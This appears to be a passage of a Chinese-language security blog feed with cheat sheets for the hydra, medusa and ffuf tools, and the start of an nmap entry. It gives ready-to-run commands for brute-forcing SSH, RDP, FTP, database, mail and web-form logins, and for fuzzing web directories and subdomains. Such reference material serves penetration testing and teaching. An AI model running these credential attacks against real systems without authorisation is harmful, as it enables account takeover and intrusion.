        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">Syntax: hydra [-l LOGIN|-L FILE] [-p PASS|-P FILE] [service://server[:PORT][/OPT]｜-M FILE]</span><br><span class="line">service指定服务名，支持的服务和协议</span><br><span class="line">server目标:DNS、IP或192.168.0.0/24(这个或-M选项)</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">-l LOGIN or -L FILE     使用指定登录名登录，或者使用文件加载多个登录名</span><br><span class="line">-p PASS or -P FILE      使用指定密码登录，或者使用文件加载多个密码</span><br><span class="line">-C FILE                 使用冒号分割格式，例如“登录名:密码”来代替 -L/-P 参数</span><br><span class="line">-M FILE                 要攻击的服务器列表，每行一个条目，&#x27;:&#x27;指定端口</span><br><span class="line">-R                      恢复先前终止/崩溃的会话</span><br><span class="line">-I                      忽略现有的还原文件(不要等待10秒)</span><br><span class="line">-S                      执行SSL连接</span><br><span class="line">-s PORT                 如果服务在不同的默认端口上，则在这里定义它</span><br><span class="line">-x MIN:MAX:CHARSET      密码暴力生成, 使用’-x -h‘获取帮助</span><br><span class="line">-y                      暴力破解时忽略符号</span><br><span class="line">-e nsr                  可选选项，n:空密码试探，s:使用指定用户和密码试探，或“r”反向登录</span><br><span class="line">-u                      循环用户，而不是密码(有效!用-x表示)</span><br><span class="line">-o FILE                 将找到的登录名/密码对写入FILE而不是输出</span><br><span class="line">-b FORMAT               指定-o文件的格式:text(默认)，json, jsonv1</span><br><span class="line">-f / -F                 当找到login/pass对时退出(-M: -f per host， -f global)</span><br><span class="line">-t TASKS                同时运行的线程数，默认为16</span><br><span class="line">-T TASKS                运行线程 (默认64)</span><br><span class="line">-w / -W TIME            设置最大超时的时间，单位秒，默认是30s</span><br><span class="line">-c TIME                 所有线程上每次登录尝试的等待时间(强制执行-t 1)</span><br><span class="line">-4 / -6                 使用IPv4(默认)/ IPv6地址(将always放在[]中，也放在-M中)</span><br><span class="line">-v / -V / -d            详细模式/每次尝试显示登录+通过/调试模式</span><br><span class="line">-O                      使用旧的SSL v2和v3</span><br><span class="line">-K                      不重做失败的尝试(适用于-M批量扫描)</span><br><span class="line">-q                      不打印有关连接错误的消息</span><br><span class="line">-U                      服务模块使用详情</span><br><span class="line">-m OPT                  选项特定于模块，请参见-U output获取信息</span><br><span class="line"># OPT 一些服务模块支持额外输入(-U表示模块帮助)</span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line"></span><br><span class="line"># ftp IP-segment</span><br><span class="line">hydra -l admin -p password ftp://[192.168.0.0/24]/</span><br><span class="line"></span><br><span class="line"># imap</span><br><span class="line">hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN</span><br><span class="line"></span><br><span class="line"># pop3</span><br><span class="line">hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5</span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br></pre></td></tr></table></figure><table><thead><tr><th>服务</th><th>服务&#x2F;协议</th><th>描述</th><th>示例命令</th></tr></thead><tbody><tr><td>FTP</td><td>文件传输协议 (FTP)</td><td>用于强制获取 FTP 服务的登录凭据，通常用于通过网络传输文件。</td><td><code>hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100</code></td></tr><tr><td>SSH</td><td>安全外壳 (SSH)</td><td>针对 SSH 服务进行暴力破解凭证，通常用于安全远程登录系统。</td><td><code>hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100</code></td></tr><tr><td>http-post-fom</td><td>HTTP Web 服务</td><td>用于通过 GET 或 POST 请求强制获取 HTTP Web 登录表单的登录凭据。</td><td><code>hydra -l admin -P /path/to/password_list.txt http-post-form &quot;/login.php:user=^USER^&amp;pass=^PASS^:F=incorrect&quot;</code></td></tr><tr><td>smtp</td><td>简单邮件传输协议</td><td>通过暴力破解通常用于发送电子邮件的 SMTP 登录凭据来攻击电子邮件服务器。</td><td><code>hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com</code></td></tr><tr><td>pop3</td><td>邮局协议 (POP3)</td><td>以电子邮件检索服务为目标，暴力破解 POP3 登录凭证。</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com</code></td></tr><tr><td>imap</td><td>互联网消息访问协议</td><td>用于强制获取 IMAP 服务的凭证，从而允许用户远程访问他们的电子邮件。</td><td><code>hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com</code></td></tr><tr><td>mysql</td><td>MySQL 数据库</td><td>尝试强制获取 MySQL 数据库的登录凭据。</td><td><code>hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100</code></td></tr><tr><td>mssql</td><td>微软 SQL 服务器</td><td>以 Microsoft SQL 服务器为目标，暴力破解数据库登录凭据。</td><td><code>hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100</code></td></tr><tr><td>vnc</td><td>虚拟网络计算 (VNC)</td><td>暴力破解 VNC 服务，用于远程桌面访问。</td><td><code>hydra -P /path/to/password_list.txt vnc://192.168.1.100</code></td></tr><tr><td>rdp</td><td>远程桌面协议 (RDP)</td><td>针对 Microsoft RDP 服务进行远程登录暴力破解。</td><td><code>hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100</code></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对多个服务器</span></span><br><span class="line">hydra -l root -p toor -M targets.txt ssh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HTTP GET</span></span><br><span class="line">hydra -L usernames.txt -P passwords.txt www.example.com http-get</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HTTP POST-Form</span></span><br><span class="line">hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form &quot;/:username=^USER^&amp;password=^PASS^:F=Invalid credentials&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">F=Field 指示尝试失败</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">S=302 指示登录成功</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可以指定Respond包中的字符串</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码组合 密码策略由6到8个字符组成，包括小写字母、大写字母和数字</span></span><br><span class="line">hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 rdp://192.168.1.100</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HTTP Authorization: Basic YWxpY2U6c2VjcmV0MTIz</span></span><br><span class="line">hydra -l basic-auth-user -P passwords.txt 10.10.10.10 -s 81 http-get /</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SSH</span></span><br><span class="line">hydra -l admin -P /path/to/password_list.txt ssh://192.168.1.1</span><br><span class="line">hydra -L /path/to/usernames.txt -P /path/to/password_list.txt ssh://192.168.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">FTP</span></span><br><span class="line">hydra -l &lt;username&gt; -P &lt;password_list&gt; ftp://&lt;target_ip&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">RDP</span></span><br><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 rdp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SMB</span></span><br><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 smb</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POP3</span></span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 pop3</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mssql</span></span><br><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mssql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mysql</span></span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 mysql</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Redis</span></span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 oracle</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">PgSQL</span></span><br><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 postgresql</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>medusa</title>
      <link href="/2024/09/09/tools/crack/medusa/"/>
      <url>/2024/09/09/tools/crack/medusa/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">medusa [-h 主机名|-H 文件] [-u 用户名|-U 文件] [-p 密码|-P 文件] [-C 文件] -M 模块 [选项]</span><br><span class="line"></span><br><span class="line">-h [TEXT]    : 目标主机名或IP地址</span><br><span class="line">-H [FILE]    : 包含目标主机名或IP地址的文件</span><br><span class="line">-u [TEXT]    : 要测试的用户名</span><br><span class="line">-U [FILE]    : 包含要测试的用户名的文件</span><br><span class="line">-p [TEXT]    : 要测试的密码</span><br><span class="line">-P [FILE]    : 包含要测试的密码的文件</span><br><span class="line">-C [FILE]    : 包含组合项的文件。更多信息见README。</span><br><span class="line">-O [FILE]    : 将日志信息附加到指定文件</span><br><span class="line">-e [n/s/ns]  : 额外的密码检查选项（`n` 无密码，`s` 密码 = 用户名）</span><br><span class="line">-M [TEXT]    : 要执行的模块名称（不包括 `.mod` 扩展名）</span><br><span class="line">-m [TEXT]    : 传递给模块的参数。可以多次传递不同参数（如 `-m 参数1 -m 参数2` 等）</span><br><span class="line">-d           : 列出所有已知的模块</span><br><span class="line">-n [NUM]     : 使用非默认的TCP端口号</span><br><span class="line">-s           : 启用SSL</span><br><span class="line">-g [NUM]     : 连接超时的最大等待时间，单位为秒（默认 3 秒）</span><br><span class="line">-r [NUM]     : 重试之间的睡眠时间，单位为秒（默认 3 秒）</span><br><span class="line">-R [NUM]     : 重试次数，达到该次数后放弃，总尝试次数为 `NUM + 1`</span><br><span class="line">-c [NUM]     : 验证套接字可用时的等待时间，单位为微秒（默认 500 微秒）</span><br><span class="line">-t [NUM]     : 同时测试的登录数量</span><br><span class="line">-T [NUM]     : 同时测试的主机数量</span><br><span class="line">-L           : 每个线程使用一个用户名并行登录。默认是先处理所有用户名后再进行</span><br><span class="line">-f           : 找到第一个有效的用户名/密码后停止扫描主机</span><br><span class="line">-F           : 找到任何主机上的第一个有效用户名/密码后停止审计</span><br><span class="line">-b           : 屏蔽启动横幅</span><br><span class="line">-q           : 显示模块的使用信息</span><br><span class="line">-v [NUM]     : 设置详细输出级别 [0 - 6，数字越大越详细]</span><br><span class="line">-w [NUM]     : 错误调试输出级别 [0 - 10，数字越大越详细]</span><br><span class="line">-V           : 显示版本信息</span><br><span class="line">-Z [TEXT]    : 根据先前扫描的结果图恢复扫描</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">模块</th><th>服务&#x2F;协议</th><th>描述</th><th>使用示例</th></tr></thead><tbody><tr><td align="left">FTP</td><td>文件传输协议</td><td>暴力破解 FTP 登录凭据，用于通过网络传输文件。</td><td><code>medusa -M ftp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr><td align="left">HTTP</td><td>超文本传输协议</td><td>通过 HTTP（GET&#x2F;POST）对 Web 应用程序上的登录表单进行暴力破解。</td><td><code>medusa -M http -h www.example.com -U users.txt -P passwords.txt -m DIR:/login.php -m FORM:username=^USER^&amp;password=^PASS^</code></td></tr><tr><td align="left">IMAP</td><td>互联网消息访问协议</td><td>暴力破解 IMAP 登录，通常用于访问电子邮件服务器。</td><td><code>medusa -M imap -h mail.example.com -U users.txt -P passwords.txt</code></td></tr><tr><td align="left">MySQL</td><td>MySQL 数据库</td><td>暴力破解 MySQL 数据库凭证，常用于 Web 应用程序和数据库。</td><td><code>medusa -M mysql -h 192.168.1.100 -u root -P passwords.txt</code></td></tr><tr><td align="left">POP3</td><td>邮局协议 3</td><td>强制 POP3 登录，通常用于从邮件服务器检索电子邮件。</td><td><code>medusa -M pop3 -h mail.example.com -U users.txt -P passwords.txt</code></td></tr><tr><td align="left">RDP</td><td>远程桌面协议</td><td>暴力破解 RDP 登录，常用于 Windows 系统的远程桌面访问。</td><td><code>medusa -M rdp -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr><td align="left">SSH</td><td>安全外壳 (SSH)</td><td>暴力破解 SSH 登录，常用于安全远程访问。</td><td><code>medusa -M ssh -h 192.168.1.100 -u root -P passwords.txt</code></td></tr><tr><td align="left">SVN</td><td>版本控制系统</td><td>强制使用 Subversion（SVN）存储库进行版本控制。</td><td><code>medusa -M svn -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr><td align="left">Telnet</td><td>Telnet 协议</td><td>在旧系统上强制执行 Telnet 服务以执行远程命令。</td><td><code>medusa -M telnet -h 192.168.1.100 -u admin -P passwords.txt</code></td></tr><tr><td align="left">vnc</td><td>虚拟网络计算</td><td>强制获取远程桌面访问的 VNC 登录凭据。</td><td><code>medusa -M vnc -h 192.168.1.100 -P passwords.txt</code></td></tr><tr><td align="left">Web form</td><td>暴力破解 Web 登录表单</td><td>使用 HTTP POST 请求强制破解网站上的登录表单。</td><td><code>medusa -M web-form -h www.example.com -U users.txt -P passwords.txt -m FORM:&quot;username=^USER^&amp;password=^PASS^:F=Invalid&quot;</code></td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆破 ssh</span></span><br><span class="line">medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">针对多个服务器</span></span><br><span class="line">medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试空密码</span></span><br><span class="line">medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ffuf</title>
      <link href="/2024/09/08/tools/enum/ffuf/"/>
      <url>/2024/09/08/tools/enum/ffuf/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">Usage: ffuf [command...]</span><br><span class="line"></span><br><span class="line">HTTP选项:</span><br><span class="line">-H          请求头&#x27;Name:Value&#x27;用冒号分隔。可接受多个标志</span><br><span class="line">-X          要使用的HTTP方法。如get,post</span><br><span class="line">-b          Cookie数据`&quot;NAME1=VALUE1; NAME2=VALUE2&quot;`</span><br><span class="line">-d          POST 数据</span><br><span class="line">-http2      使用HTTP2协议（默认值：false）</span><br><span class="line">-ignore-body不要获取响应内容。（默认值：false）</span><br><span class="line">-r          遵循重定向（默认值：false）</span><br><span class="line">-recursion  递归扫描，只支持FUZZ关键字，并且-u结尾（默认值：false）</span><br><span class="line">-recursion-depth        最大递归深度。（默认值：0）</span><br><span class="line">-replay-proxy   使用此代理重播匹配的请求</span><br><span class="line">-timeout        HTTP请求超时（秒）。（默认值：10）</span><br><span class="line">-u          目标url</span><br><span class="line">-x          代理URL（SOCKS5或HTTP）。例如：http://127.0.0.1:8080或socks5://127.0.0.1:8080</span><br><span class="line"></span><br><span class="line">常规选项</span><br><span class="line">-V          显示版本信息（默认值：false）</span><br><span class="line">-ac         自动校准过滤选项（默认值：false）</span><br><span class="line">-acc        自定义自动校准字符串。可以多次使用。含义-ac</span><br><span class="line">-ach        每主机自动校准（默认值：false）</span><br><span class="line">-ack        自动校准关键字（默认值：FUZZ）</span><br><span class="line">-acs        自动校准策略：“基本”或“高级”（默认值：基本）</span><br><span class="line">-c          将输出着色。（默认值：false）</span><br><span class="line">-config     从文件加载配置</span><br><span class="line">-json       json输出，打印换行分隔的json记录（默认值：false）</span><br><span class="line">-maxtime    整个进程的最大运行时间（以秒为单位）。（默认值：0）</span><br><span class="line">-maxtime-job    作业每个作业的最大运行时间（以秒为单位）。（默认值：0）</span><br><span class="line">-noninteractive 非交互式禁用交互式控制台功能（默认值：false）</span><br><span class="line">-p          请求之间的“延迟”秒数，或一系列随机延迟。例如“0.1”或“0.1-2.0”</span><br><span class="line">-rate       每秒请求的速率（默认值：0）</span><br><span class="line">-s          不打印附加信息（静默模式）（默认值：false）</span><br><span class="line">-sa         在所有错误情况下停止。暗示-sf和-se。（默认值：false）</span><br><span class="line">-se         在出现虚假错误时停止（默认值：false）</span><br><span class="line">-sf         当&gt;95%的响应返回403 Forbidden时停止（默认值：false）</span><br><span class="line">-t          并发线程数。（默认值：40）</span><br><span class="line">-v          详细输出，打印完整的URL和重定向位置（如果有）以及结果。（默认值：false）</span><br><span class="line"></span><br><span class="line">匹配器选项</span><br><span class="line">-mc         匹配HTTP状态代码，或“全部”表示所有内容。（默认值：200,204,301,302,307,403,404,500）</span><br><span class="line">-ml         匹配响应行数</span><br><span class="line">-mmode      匹配器集运算符。以下任一项：和或（默认值：或）</span><br><span class="line">-mr         匹配正则表达式</span><br><span class="line">-ms         匹配HTTP响应大小</span><br><span class="line">-mt         匹配第一个响应字节的毫秒数，大于或小于。例如：&gt;100或&lt;100</span><br><span class="line">-mw         匹配响应的单词数量</span><br><span class="line"></span><br><span class="line">过滤器选项</span><br><span class="line">-fc         从响应中筛选HTTP状态代码。代码和范围的逗号分隔列表</span><br><span class="line">-fl         根据响应的行数进行过滤。行计数和范围的逗号分隔列表</span><br><span class="line">-fmode      筛选器集运算符。以下任一项：和或（默认值：或）</span><br><span class="line">-fr         筛选器正则表达式</span><br><span class="line">-fs         筛选器HTTP响应大小。大小和范围的逗号分隔列表</span><br><span class="line">-ft         根据到第一个响应字节的毫秒数进行筛选，大于或小于。例如：&gt;100或&lt;100</span><br><span class="line">-fw         按响应的字数进行筛选。以逗号分隔的单词计数和响铃列表</span><br><span class="line"></span><br><span class="line">输入选项</span><br><span class="line">-D          DirSearch单词列表兼容模式。与-e标志一起使用。（默认值：false）</span><br><span class="line">-e          扩展名的逗号分隔列表，复制字典并添加扩展</span><br><span class="line">-ic         忽略单词列表注释（默认值：false）</span><br><span class="line">-input-cmd      要测试的输入数。与--input cmd一起使用。（默认值：100）</span><br><span class="line">-input-shell    用于运行命令的外壳</span><br><span class="line">-mode       多单词列表操作模式。可用模式：clusterbomb,pitchfork,sniper(default: clusterbomb)</span><br><span class="line">-request    包含原始http请求的文件</span><br><span class="line">-request-proto          与原始请求一起使用的协议（默认值：https）</span><br><span class="line">-w          用冒号分隔的单词列表文件路径和（可选）关键字</span><br><span class="line"></span><br><span class="line">输出选项</span><br><span class="line">-debug-log      将所有内部日志记录写入指定的文件。</span><br><span class="line">-o              将输出写入文件</span><br><span class="line">-od             将匹配结果存储到的目录路径</span><br><span class="line">-of             输出文件格式。可用格式:json、ejson、html、md、csv、ecsv(或所有格式的“all”)(默认值：json)</span><br><span class="line">-or             如果没有结果，就不要创建输出文件（默认值：false）</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Web fuzz</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目录</span></span><br><span class="line">ffuf -w /path/to/seclists/dict/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://SERVER_IP:PORT/FUZZ</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扩展名类型</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/web-extensions.txt -u http://SERVER_IP:PORT/indexFUZZ</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">扩展名</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://SERVER_IP:PORT/FUZZ.php</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Subdomain fuzz</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">HTTP</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.example.htb/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Vhost</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.htb -H &#x27;Host: FUZZ.example.htb&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Param fuzz</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">GET</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://example.htb/get.php?FUZZ=key</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">POST</span></span><br><span class="line">ffuf -w /path/to/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;FUZZ=key&#x27; -u http://example.htb/post.php</span><br></pre></td></tr></table></figure><p>…</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Enumeration </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap</title>
      <link href="/2024/09/08/tools/enum/nmap/"/>
      <url>/2024/09/08/tools/enum/nmap/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 